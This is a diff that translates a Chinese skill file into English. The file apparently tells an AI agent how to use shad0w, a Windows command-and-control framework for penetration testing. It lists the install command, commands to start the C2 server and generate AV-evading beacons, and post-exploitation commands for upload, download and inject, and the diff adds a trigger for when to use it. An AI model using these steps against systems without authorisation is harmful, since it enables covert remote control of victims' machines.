@@ -2,38 +2,42 @@
 name: shad0w-c2-windows
 description: "shad0w: Windows pentest C2. Signals: c2, command-and-control, start server, generate beacon, payload type."
 zh-signals: "shad0w: Windows 渗透 C2。信号:c2,命令控制,启动服务端,生成 beacon,载荷类型。"
+when-to-use: >-
+  Use when establishing a Windows-focused command-and-control channel during a
+  penetration test; start the server, generate a staged or stageless beacon,
+  and manage post-exploitation from the console.
 ---
 
 # shad0w
 
-- 攻击大类:C35 C2框架
-- 上游仓库:https://github.com/bats3c/shad0w
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C35 C2 Frameworks
+- Upstream Repository: https://github.com/bats3c/shad0w
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 git clone https://github.com/bats3c/shad0w && cd shad0w && ./install.sh
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `./shad0w -c 0.0.0.0 -p 443` | 启动服务端 |
-| `python shad0w.py beacon -p x64/shellcode` | 生成 beacon |
-| `stageless/staged` | 载荷类型 |
-| `console 内 upload/download/inject` | 后渗透 |
+| `./shad0w -c 0.0.0.0 -p 443` | Start the server |
+| `python shad0w.py beacon -p x64/shellcode` | Generate a beacon |
+| `stageless/staged` | Payload type |
+| `console upload/download/inject` | Post-exploitation |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### Windows 渗透 C2
+### Windows pentest C2
 
 ```bash
 ./shad0w -c 0.0.0.0 -p 443
-python shad0w.py beacon  # 生成载荷投递,console 全控
+python shad0w.py beacon  # Generate the payload for delivery, full control from the console
 ```
 
-## 注意事项
+## Notes
 
-bats3c 出品的 C2,主打 Windows 后渗透,免杀 beacon+丰富模块,控制台为 Python。
+C2 by bats3c, focused on Windows post-exploitation with AV-evading beacons and rich modules, with a Python-based console.
